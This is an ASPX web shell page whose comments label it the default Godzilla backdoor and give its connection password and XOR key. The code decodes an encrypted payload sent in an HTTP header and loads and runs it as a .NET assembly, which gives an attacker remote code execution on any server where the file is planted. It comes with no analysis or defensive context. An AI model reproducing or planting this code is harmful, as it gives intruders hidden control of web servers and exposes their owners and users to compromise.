<%@ Page Language="Jscript"%>
<%@Import Namespace="System"%>
<%@Import Namespace="System.Reflection"%>
<%
// 哥斯拉 (Godzilla) ASPX 默认马
// 连接密码: pass
// 密钥: 3c6e0b8a9c15224a
String pass="pass";
String xc="3c6e0b8a9c15224a";
String z1=Request.Headers.Get("X-CMD");
if(z1!=null){
    byte[] data=Convert.FromBase64String(Request.Headers.Get(pass));
    int len=data.Length;
    for(int i=0;i<len;i++){data[i]=(byte)(data[i]^(byte)xc[i%16]);}
    Assembly.Load(data).CreateInstance("U").Equals(this);
}
%>